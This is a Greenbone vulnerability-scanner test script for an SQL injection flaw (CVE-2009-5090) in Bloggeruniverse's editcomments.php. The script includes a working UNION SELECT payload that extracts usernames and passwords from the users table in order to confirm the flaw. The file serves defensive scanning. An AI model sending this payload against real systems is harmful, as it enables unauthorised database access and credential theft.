# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902632");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-09-27 17:29:53 +0200 (Tue, 27 Sep 2011)");
  script_cve_id("CVE-2009-5090");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Bloggeruniverse 'editcomments.php' SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/8043/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/33744");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/48697");

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"Bloggeruniverse version 2 Beta.");

  script_tag(name:"insight", value:"The flaw is due to input passed via the 'id' parameter to
  'editcomments.php' is not properly sanitised before being used in SQL queries.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Bloggeruniverse is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)){
  exit(0);
}

vt_strings = get_vt_strings();

foreach dir (make_list_unique("/bloggeruniverse", "/blog", "/bg", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port:port);
  if("Bloggeruniverse" >< res && "CopyRight &copy;" >< res)
  {
    url = dir + "/editcomments.php?id=-2%20union%20all%20select%201,2,3,4,5" +
                ",6,concat(0x" + vt_strings["lowercase_hex"]  + ",0x3a,username,0x3a,password,0x3a,0" +
                "x" + vt_strings["lowercase_hex"] + "),8%20from%20users";

    if(http_vuln_check(port:port, url:url, pattern:">" + vt_strings["lowercase"] + ":(.+):(.+):" + vt_strings["lowercase"])) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
